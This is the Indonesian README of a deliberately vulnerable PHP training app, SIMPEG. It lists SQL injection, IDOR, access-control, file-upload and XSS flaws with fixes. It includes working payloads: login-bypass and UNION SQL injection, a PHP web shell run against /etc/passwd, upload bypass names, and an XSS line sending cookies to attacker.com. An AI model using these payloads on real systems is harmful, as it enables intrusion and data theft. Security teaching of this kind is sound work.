# SIMPEG - Simulasi Keamanan Siber

Aplikasi web PHP yang sengaja dibuat rentan untuk pembelajaran keamanan siber.

## Instalasi

### Opsi 1: Docker (Direkomendasikan)

```bash
# Build & jalankan container
docker-compose up -d --build

# Tunggu beberapa saat hingga database siap, lalu akses:
# Aplikasi  : http://localhost:8080
# phpMyAdmin : http://localhost:8081  (root / rootpassword)

# Hentikan container
docker-compose down

# Reset database (hapus volume)
docker-compose down -v && docker-compose up -d --build
```

### Opsi 2: Manual (XAMPP/LAMPP/MAMP)

1. Jalankan XAMPP/LAMPP/MAMP dan nyalakan Apache + MySQL
2. Import database: `mysql -u root < sql/init.sql`
3. Letakkan folder `vulnerable-app` di `htdocs` (atau `www`)
4. Akses di browser: `http://localhost/vulnerable-app/`

### Kredensial Default

| Username | Password  | Role  |
|----------|-----------|-------|
| admin    | admin123  | admin |
| user1    | user123   | user  |
| operator | op123     | user  |

---

## DAFTAR CELAH KEAMANAN

---

## 1. SQL INJECTION (SQLi)

### Lokasi Celah

| File               | Baris | Parameter |
|--------------------|-------|-----------|
| login.php          | 10-11 | username, password |
| dashboard.php      | 14    | search (GET) |
| pegawai_detail.php | 10    | id (GET) |
| users.php          | 13    | delete (GET) |
| users.php          | 21    | user_id, role, nama (POST) |
| profile.php        | 12    | id (GET) |

### Cara Menyerang

#### A. Bypass Login (Classic SQLi)
Pada halaman login, masukkan:

```
Username: ' OR '1'='1' -- 
Password: (kosongkan atau apa saja)
```

Atau:

```
Username: admin' --
Password: (kosongkan)
```

Hasil: Query menjadi:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = ''
```
Semua baris terpilih karena `OR 1=1` selalu true.

#### B. Ekstrak Data dengan UNION
Pada URL detail pegawai:

```
http://localhost/vulnerable-app/pegawai_detail.php?id=1 UNION SELECT 1,username,password,role,nama FROM users
```

Pada search dashboard:

```
http://localhost/vulnerable-app/dashboard.php?search=' UNION SELECT 1,username,password,role,nama FROM users --
```

#### C. Blind SQLi
```
http://localhost/vulnerable-app/pegawai_detail.php?id=1 AND 1=1
http://localhost/vulnerable-app/pegawai_detail.php?id=1 AND 1=2
```

#### D. Time-Based Blind SQLi (MySQL)
```
http://localhost/vulnerable-app/pegawai_detail.php?id=1 AND SLEEP(5)
```

### Cara Memperbaiki

```php
// 1. Gunakan Prepared Statements (Parameterized Queries)
$stmt = $conn->prepare("SELECT * FROM pegawai WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
$result = $stmt->get_result();

// 2. Gunakan PDO
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND password = :password");
$stmt->execute(['username' => $username, 'password' => $password]);

// 3. Validasi dan sanitasi input
$id = (int)$_GET['id']; // Cast ke integer
$search = mysqli_real_escape_string($conn, $_GET['search']); // Escape string

// 4. Jangan pernah menampilkan error database ke user
// Matikan display_errors di php.ini
ini_set('display_errors', 0);
```

---

## 2. IDOR (Insecure Direct Object Reference)

### Lokasi Celah

| File               | Baris | Parameter | Deskripsi |
|--------------------|-------|-----------|-----------|
| pegawai_detail.php | 10    | id        | Bisa lihat detail pegawai manapun |
| profile.php        | 10    | id        | Bisa lihat profil user lain + password |
| users.php          | 13    | delete    | Bisa hapus user lain (termasuk admin) |
| users.php          | 20    | user_id   | Bisa edit user manapun |

### Cara Menyerang

#### A. Akses Detail Pegawai Lain
Login sebagai `user1`, lalu akses:

```
http://localhost/vulnerable-app/pegawai_detail.php?id=3
http://localhost/vulnerable-app/pegawai_detail.php?id=5
http://localhost/vulnerable-app/pegawai_detail.php?id=10
```

Tidak ada pengecekan otorisasi - semua ID bisa diakses.

#### B. Lihat Profil User Lain (termasuk password plaintext)

```
http://localhost/vulnerable-app/profile.php?id=1   (Admin)
http://localhost/vulnerable-app/profile.php?id=2   (User Lain)
```

Password terlihat dalam bentuk plaintext!

#### C. Hapus User Lain
```
http://localhost/vulnerable-app/users.php?delete=1  (Hapus admin!)
http://localhost/vulnerable-app/users.php?delete=3
```

### Cara Memperbaiki

```php
// 1. Validasi kepemilikan data
$user_id = $_SESSION['user_id'];
$stmt = $conn->prepare("SELECT * FROM profile WHERE id = ? AND user_id = ?");
$stmt->bind_param("ii", $id, $user_id);

// 2. Gunakan UUID atau hash yang tidak bisa ditebak
// Daripada ?id=1, gunakan ?uuid=abc-def-ghi

// 3. Cek otorisasi sebelum operasi sensitif
if ($_SESSION['role'] !== 'admin') {
    header("HTTP/1.0 403 Forbidden");
    die("Akses ditolak");
}

// 4. Jangan pernah menampilkan password di halaman
// Hash password dengan password_hash() dan jangan tampilkan

// 5. Konfirmasi aksi destruktif di server-side, bukan hanya JS
if ($_GET['delete'] == $_SESSION['user_id']) {
    die("Tidak bisa menghapus diri sendiri");
}
```

---

## 3. RBAC (Role-Based Access Control) Issues

### Lokasi Celah

| File               | Baris | Deskripsi |
|--------------------|-------|-----------|
| dashboard.php      | 6-8   | Redirect tanpa exit, akses tetap lanjut |
| users.php          | 6     | Tidak ada pengecekan role |
| pegawai_add.php    | 6     | Tidak ada pengecekan role |
| dashboard.php      | 30-35 | Informasi sensitif ke semua user |

### Cara Menyerang

#### A. Akses Halaman Admin Tanpa Login
Akses langsung URL tanpa session:

```
http://localhost/vulnerable-app/users.php
http://localhost/vulnerable-app/pegawai_add.php
```

Pada `dashboard.php`, redirect tanpa `exit()` berarti kode setelahnya tetap dieksekusi.

#### B. Privilege Escalation via Parameter
User biasa bisa mengubah role sendiri melalui halaman edit user:

```
POST /vulnerable-app/users.php
user_id=2&role=admin&nama=Hacker&edit_user=1
```

#### C. Horizontal Privilege Escalation
User biasa bisa mengakses halaman manajemen user yang seharusnya hanya untuk admin:

```
http://localhost/vulnerable-app/users.php
```

### Cara Memperbaiki

```php
// 1. Middleware pengecekan session + role
function cek_login() {
    if (!isset($_SESSION['user_id'])) {
        header("Location: login.php");
        exit(); // WAJIB: exit setelah header redirect
    }
}

function cek_admin() {
    cek_login();
    if ($_SESSION['role'] !== 'admin') {
        header("HTTP/1.0 403 Forbidden");
        die("Akses ditolak. Hanya untuk admin.");
    }
}

// 2. Terapkan di setiap halaman
cek_admin(); // Di users.php, pegawai_add.php, dll.

// 3. Jangan percaya input user untuk role
// Ambil role dari session, bukan dari form POST
$role = $_SESSION['role']; // BENAR
// $role = $_POST['role']; // SALAH - bisa dimanipulasi

// 4. Implementasi Access Control List (ACL)
$acl = [
    'dashboard' => ['admin', 'user'],
    'users'     => ['admin'],
    'pegawai_add' => ['admin'],
    'pegawai_edit' => ['admin'],
    'upload'    => ['admin', 'user'],
];
```

---

## 4. FILE UPLOAD VULNERABILITY

### Lokasi Celah

| File       | Baris | Deskripsi |
|------------|-------|-----------|
| upload.php | 11-24 | Tidak ada validasi tipe file, ekstensi, ukuran |

### Masalah Keamanan

1. Tidak ada filter ekstensi file (.php, .phtml, .php5 bisa diupload)
2. Tidak ada validasi MIME type
3. Nama file asli tidak diganti (path traversal via `../../`)
4. Tidak ada batasan ukuran file (DoS via upload file raksasa)
5. Daftar file yang sudah diupload ditampilkan ke semua user

### Cara Menyerang

#### A. Upload Web Shell
1. Buat file `shell.php`:
```php
<?php
system($_GET['cmd']);
?>
```

2. Upload file tersebut
3. Akses: `http://localhost/vulnerable-app/uploads/shell.php?cmd=id`
4. Output akan menampilkan `uid=33(www-data) gid=33(www-data)`

#### B. Perintah Berbahaya via Shell

```
http://localhost/vulnerable-app/uploads/shell.php?cmd=ls -la
http://localhost/vulnerable-app/uploads/shell.php?cmd=cat /etc/passwd
http://localhost/vulnerable-app/uploads/shell.php?cmd=cat ../../config.php
```

#### C. Upload File Berbahaya Lainnya
- `shell.php5`, `shell.phtml`, `shell.pht` (variasi ekstensi PHP)
- `shell.php.jpg` (double extension bypass pada konfigurasi tertentu)
- `shell.php%00.jpg` (null byte injection pada PHP < 5.3.4)
- `shell.asp;.jpg` (bypass pada server Windows)

#### D. Path Traversal
```
Nama file: ../../../../../etc/passwd
```
File akan ditulis di luar direktori uploads.

#### E. DoS via File Besar
Upload file berukuran sangat besar (contoh: 2GB) dapat mengisi disk server.

### Cara Memperbaiki

```php
// 1. Validasi ekstensi file (whitelist)
$allowed_ext = ['jpg', 'jpeg', 'png', 'gif', 'pdf', 'doc', 'docx'];
$ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allowed_ext)) {
    die("Ekstensi file tidak diizinkan");
}

// 2. Validasi MIME type
$allowed_mime = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'];
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $file['tmp_name']);
if (!in_array($mime, $allowed_mime)) {
    die("Tipe file tidak diizinkan");
}

// 3. Generate nama file baru (rename)
$new_filename = uniqid() . '.' . $ext;
$target = $upload_dir . $new_filename;

// 4. Batasi ukuran file
$max_size = 5 * 1024 * 1024; // 5MB
if ($file['size'] > $max_size) {
    die("Ukuran file maksimal 5MB");
}

// 5. Simpan file di luar document root
// Target: /var/www/uploads/ (tidak bisa diakses langsung via browser)
// Buat script download.php untuk mengakses file

// 6. Scan file upload dengan antivirus (opsional)

// 7. Set eksekusi permission
// Gunakan .htaccess di folder uploads:
/*
<FilesMatch "\.(php|phtml|php3|php4|php5|pl|py|jsp|asp|aspx|cgi|shtml)$">
    Order Deny,Allow
    Deny from all
</FilesMatch>
*/
```

## 5. XSS (Cross-Site Scripting)

### Lokasi Celah

| File               | Baris | Parameter | Deskripsi |
|--------------------|-------|-----------|-----------|
| dashboard.php      | 98-99 | search    | Input search direfleksikan tanpa encoding |
| dashboard.php      | 45    | session   | Nama user dari session tanpa encoding |

### Cara Menyerang

#### A. Reflected XSS via Search
Pada dashboard, masukkan di kotak pencarian:

```
<script>alert('XSS Berhasil!')</script>
```

Atau langsung via URL:

```
http://localhost:8080/dashboard.php?search=<script>alert(document.cookie)</script>
```

Hasil: Script dieksekusi karena nilai `$search` langsung di-output tanpa `htmlspecialchars()`.

#### B. Steal Cookie (Payload lebih lanjut)

```
http://localhost:8080/dashboard.php?search=<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>
```

### Cara Memperbaiki

```php
// Gunakan htmlspecialchars() untuk semua output yang mengandung data user
<input type="text" name="search" value="<?= htmlspecialchars($search, ENT_QUOTES, 'UTF-8') ?>">

// Atau gunakan filter_var()
$search = filter_var($_GET['search'], FILTER_SANITIZE_STRING);

// Content Security Policy header
header("Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.jsdelivr.net");
```

---

## RINGKASAN CELAH PER FILE

| File               | SQL Injection | IDOR | RBAC | File Upload | XSS |
|--------------------|:---:|:---:|:---:|:---:|:---:|
| login.php          |  X  |     |     |     |     |
| dashboard.php      |  X  |     |  X  |     |  X  |
| pegawai_detail.php |  X  |  X  |     |     |     |
| pegawai_add.php    |  X  |     |  X  |     |     |
| pegawai_edit.php   |  X  |  X  |  X  |     |     |
| users.php          |  X  |  X  |  X  |     |     |
| profile.php        |  X  |  X  |     |     |     |
| upload.php         |     |     |     |  X  |     |

## PANDUAN EKSPLOITASI CEPAT

### Tanpa Login (Unauthenticated)

| Serangan | URL/Payload |
|----------|-------------|
| Bypass Login | Username: `' OR '1'='1' -- ` Password: (kosong) |
| Blind SQLi (Time) | `pegawai_detail.php?id=1 AND SLEEP(5)` |

### Dengan Login Sebagai User Biasa

| Serangan | URL/Payload |
|----------|-------------|
| Lihat data pegawai lain | `pegawai_detail.php?id=5` |
| Lihat password admin | `profile.php?id=1` |
| Hapus user admin | `users.php?delete=1` |
| Upload shell | Upload file `shell.php` lalu akses `uploads/shell.php?cmd=id` |
| Edit role sendiri | POST ke `users.php` dengan `user_id=2&role=admin` |

---

## REPOSITORY KEAMANAN (Versi Fixed)

Lihat folder `secure/` untuk versi aplikasi yang sudah diperbaiki, atau terapkan panduan perbaikan di atas pada kode yang relevan.

---

> **Peringatan:** Aplikasi ini dibuat khusus untuk tujuan pembelajaran dan simulasi keamanan siber. Jangan gunakan celah ini pada sistem produksi atau tanpa izin pemilik sistem. Segala penyalahgunaan di luar tanggung jawab pengembang.
